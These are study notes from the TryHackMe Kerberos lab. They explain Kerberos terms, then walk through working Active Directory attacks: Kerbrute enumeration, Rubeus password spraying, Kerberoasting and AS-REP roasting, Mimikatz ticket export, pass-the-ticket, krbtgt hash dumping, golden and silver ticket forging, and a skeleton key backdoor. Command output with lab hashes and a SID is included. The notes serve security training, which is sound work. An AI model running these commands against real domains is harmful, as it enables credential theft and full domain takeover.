[*]  TryHackMe Kerberos room Notes
Common Terminology
	Ticket Granting Ticket (TGT)
		A ticket-granting ticket is an authentication ticket used to request service tickets from the TGS for specific resources from the domain.
	Key Distribution Center (KDC)
		The Key Distribution Center is a service for issuing TGTs and service tickets that consist of the Authentication Service and the Ticket Granting Service.
	Authentication Service (AS)
		The Authentication Service issues TGTs to be used by the TGS in the domain to request access to other machines and service tickets.
	Ticket Granting Service (TGS)
		The Ticket Granting Service takes the TGT and returns a ticket to a machine on the domain.
	Service Principal Name (SPN)
		A Service Principal Name is an identifier given to a service instance to associate a service instance with a domain service account. Windows requires that services have a domain service account which is why a service needs an SPN set.
	KDC Long Term Secret Key (KDC LT Key)
		The KDC key is based on the KRBTGT service account. It is used to encrypt the TGT and sign the PAC.
	Client Long Term Secret Key (Client LT Key)
		The client key is based on the computer or service account. It is used to check the encrypted timestamp and encrypt the session key.
	Service Long Term Secret Key (Service LT Key)
		The service key is based on the service account. It is used to encrypt the service portion of the service ticket and sign the PAC.
	Session Key
		Issued by the KDC when a TGT is issued. The user will provide the session key to the KDC along with the TGT when requesting a service ticket.
	Privilege Attribute Certificate (PAC)
		The PAC holds all of the user's relevant information, it is sent along with the TGT to the KDC to be signed by the Target LT Key and the KDC LT Key in order to validate the user.


[*] AS-REQ - Worflow
	User encrypts a timestamp NT hash and sends it to the AS.
	KDC attempts to decrypt using NT hash from user.
	If successful, KDC issues TGT and session key for user.

[*] Kerberos Authentication Overview
	AS-REQ - 1.) The client requests an Authentication Ticket or Ticket Granting Ticket (TGT).
	AS-REP - 2.) The Key Distribution Center verifies the client and sends back an encrypted TGT.
	TGS-REQ - 3.) The client sends the encrypted TGT to the Ticket Granting Server (TGS) with the Service Principal Name (SPN) of the service the client wants to access.
	TGS-REP - 4.) The Key Distribution Center (KDC) verifies the TGT of the user and that the user has access to the service, then sends a valid session key for the service to the client.
	AP-REQ - 5.) The client requests the service and sends the valid session key to prove the user has access.
	AP-REP - 6.) The service grants access


[*] Attack Privilege Requirements
	Kerbrute Enumeration - No domain access required 
	Pass the Ticket - Access as a user to the domain required
	Kerberoasting - Access as any user required
	AS-REP Roasting - Access as any user required
	Golden Ticket - Full domain compromise (domain admin) required 
	Silver Ticket - Service hash required 
	Skeleton Key - Full domain compromise (domain admin) required


[*] Kerbrute
	Tool used for enumerating users without causing failed login attempts (enumuser argument)
		https://github.com/ropnop/kerbrute/releases
	Usernames if unable to collect any against the organization you are attacking:
		https://github.com/Cryilllic/Active-Directory-Wordlists/blob/master/User.txt
		Would recommend doing some OSINT though
	Examples:
		./kerbrute userenum --dc controller.local -d controller.local usernames.txt

[*] Rubeus
	Adaptation of the kekeo tool
	Many tools and attacks include overpass the hash, ticket requests and renewals, ticket management, ticket extraction, harvesting, pass the ticket, AS-REP Roasting, and Kerberoasting
	Source code and downloads on git
		https://github.com/GhostPack/Rubeus
	Examples:
		Harvest TGTs every 30 seconds:
			.\Rubesus.exe harvest interval:30
		Brute-Forcing / Password-Spraying with Rubeus
			Password spray using "Password1" - be aware you may lock yourself out of the network
				Rubeus.exe brute /password:Password1 /noticket
		Kerberoasting with Rubeus
			Rubeus.exe kerberoast
			Then crack the hash
			hashcat -m 13100 -a 0 hash.txt Pass.txt
		Kerberoasting with Impacket
			GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.78.181 -request
			hashcat -m 13100 -a 0 hash.txt Pass.txt
		AS-REP Roasting - pre-authentication must be disabled though
			Other tools - kekeo and Impacket's GetNPUsers.py
			Rubeus.exe asreproast
				add 23$ after $krb5asrep$ so hashcat can crack, $krb5asrep$23$User
				hashcat -m 18200 hash.txt Pass.txt


[*] Pass the Ticket with Mimikatz
	Verify we can debug privs, status shouild be '20' OK
		.\mimikatz.exe
		privilege::debug
	Assuming we get the 20 OK, export the .kirbi tickets into current working directory
		sekurlsa::tickets /export
	Example of an Administrator .kirbi ticket
		10/06/2021  10:18 PM             1,595 [0;4b2c5]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi
	Pass the Ticket with mimikatz:
		mimikatz # kerberos::ptt [0;4b2c5]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi
		* File: '[0;4b2c5]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi': OK
	Use klist to check our impersonated tickets, should be Administrator
		controller\administrator@CONTROLLER-1 C:\Users\Administrator\Downloads>klist

		Current LogonId is 0:0x4b2c5

		Cached Tickets: (1)

		#0>     Client: Administrator @ CONTROLLER.LOCAL
       		Server: krbtgt/CONTROLLER.LOCAL @ CONTROLLER.LOCAL
       		KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
       		Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
       		Start Time: 10/6/2021 22:17:27 (local)
       		End Time:   10/7/2021 8:17:27 (local)
       		Renew Time: 10/13/2021 22:17:27 (local)
       		Session Key Type: AES-256-CTS-HMAC-SHA1-96
       		Cache Flags: 0x1 -> PRIMARY
       		Kdc Called:

[*] Golden/Silver Ticket Attack with Mimikatz
	Golden ticket == KRBTGT Service Account for the KDC - attack creates a ticket for any services
	Silver Ticket == Service ticket for each service - limits access to each service. Multiple tickets will be needed as you can only access one service per ticket
	Using Mimikatz, verify privilege debug is 20 OK
		mimikatz # privilege::debug 
		Privilege '20' OK
	Dump hash and security identifier needed to create Golden ticket
		lsadump::lsa /inject /name:krbtgt
	Dump hash and security identifier for a service account or domain admin - needed for Silver Ticket
		lsadump::lsa /inject /name:SQLService
	Create the golden ticket - example lsa dump

mimikatz # lsadump::lsa /inject /name:krbtgt 
Domain : CONTROLLER / S-1-5-21-432953485-3795405108-1502158860 

RID  : 000001f6 (502)
User : krbtgt

 * Primary
    NTLM : 72cd714611b64cd4d5550cd2759db3f6
    LM   :
  Hash NTLM: 72cd714611b64cd4d5550cd2759db3f6 
    ntlm- 0: 72cd714611b64cd4d5550cd2759db3f6
    lm  - 0: aec7e106ddd23b3928f7b530f60df4b6

 * WDigest
    01  d2e9aa3caa4509c3f11521c70539e4ad
    02  c9a868fc195308b03d72daa4a5a4ee47
    03  171e066e448391c934d0681986f09ff4 
    04  d2e9aa3caa4509c3f11521c70539e4ad
    05  c9a868fc195308b03d72daa4a5a4ee47
    06  41903264777c4392345816b7ecbf0885
    07  d2e9aa3caa4509c3f11521c70539e4ad
    08  9a01474aa116953e6db452bb5cd7dc49
    09  a8e9a6a41c9a6bf658094206b51a4ead
    10  8720ff9de506f647ad30f6967b8fe61e 
    11  841061e45fdc428e3f10f69ec46a9c6d
    12  a8e9a6a41c9a6bf658094206b51a4ead
    13  89d0db1c4f5d63ef4bacca5369f79a55
    14  841061e45fdc428e3f10f69ec46a9c6d
    15  a02ffdef87fc2a3969554c3f5465042a 
    16  4ce3ef8eb619a101919eee6cc0f22060
    17  a7c3387ac2f0d6c6a37ee34aecf8e47e
    18  085f371533fc3860fdbf0c44148ae730
    19  265525114c2c3581340ddb00e018683b
    20  f5708f35889eee51a5fa0fb4ef337a9b
    21  bffaf3c4eba18fd4c845965b64fca8e2
    22  bffaf3c4eba18fd4c845965b64fca8e2
    23  3c10f0ae74f162c4b81bf2a463a344aa
    24  96141c5119871bfb2a29c7ea7f0facef
    25  f9e06fa832311bd00a07323980819074
    26  99d1dd6629056af22d1aea639398825b 
    27  919f61b2c84eb1ff8d49ddc7871ab9e0
    28  d5c266414ac9496e0e66ddcac2cbcc3b
    29  aae5e850f950ef83a371abda478e05db

 * Kerberos
    Default Salt : CONTROLLER.LOCALkrbtgt
    Credentials
      des_cbc_md5       : 79bf07137a8a6b8f

 * Kerberos-Newer-Keys
    Default Salt : CONTROLLER.LOCALkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : dfb518984a8965ca7504d6d5fb1cbab56d444c58ddff6c193b64fe6b6acf1033
      aes128_hmac       (4096) : 88cc87377b02a885b84fe7050f336d9b 
      des_cbc_md5       (4096) : 79bf07137a8a6b8f

 * NTLM-Strong-NTOWF
    Random Value : 4b9102d709aada4d56a27b6c3cd14223


	Next create the ticket
	mimikatz # Kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-432953485-3795405108-1502158860 /krbtgt:72cd714611b64cd4d5550cd275
9db3f6 /id:502\ 
User      : Administrator 
Domain    : controller.local (CONTROLLER)
SID       : S-1-5-21-432953485-3795405108-1502158860
User Id   : 502
Groups Id : *513 512 520 518 519
ServiceKey: 72cd714611b64cd4d5550cd2759db3f6 - rc4_hmac_nt
Lifetime  : 10/6/2021 11:18:46 PM ; 10/4/2031 11:18:46 PM ; 10/4/2031 11:18:46 PM
-> Ticket : ticket.kirbi

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Final Ticket Saved to file !


	To obtain a silver ticket, do the same but the NTLM hash is a service hash.
		Change the SID to service account SID
		Change id to 1103


[*] Kerberos backdoor
	Implanting a skeleton key requires Kerberos RC4 encryption
	Default hash for mimikatz is:
		60BA4FCADC466C7A033C178194C03DF6 which makes the password -"mimikatz"
	Skeleton key works by abusing AS-REQ encrypted timestamps
	Check privs in mimikatz:
		mimikatz # privilege::debug 
		Privilege '20' OK
	Create Backdoor / skeleton key
		mimikatz # misc::skeleton 
		[KDC] data 
		[KDC] struct
		[KDC] keys patch OK
		[RC4] functions
		[RC4] init patch OK
		[RC4] decrypt patch OK
	Default password is mimikatz (change for red teaming)
	Examples of moving around
		net use c:\\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz
		dir \\Desktop-1\c$ /user:Machine1 mimikatz
	Skeleton key is not persistent, lives in memory. Yo ucan automate creation - think of an auto-service on boot


[*] Resources!
	https://medium.com/@t0pazg3m/pass-the-ticket-ptt-attack-in-mimikatz-and-a-gotcha-96a5805e257a
	https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat
	https://posts.specterops.io/kerberoasting-revisited-d434351bd4d1
	https://www.harmj0y.net/blog/redteaming/not-a-security-boundary-breaking-forest-trusts/
	https://www.varonis.com/blog/kerberos-authentication-explained/
	https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It-wp.pdf
	https://www.sans.org/cyber-security-summit/archives/file/summit-archive-1493862736.pdf
	https://www.redsiege.com/wp-content/uploads/2020/04/20200430-kerb101.pdf
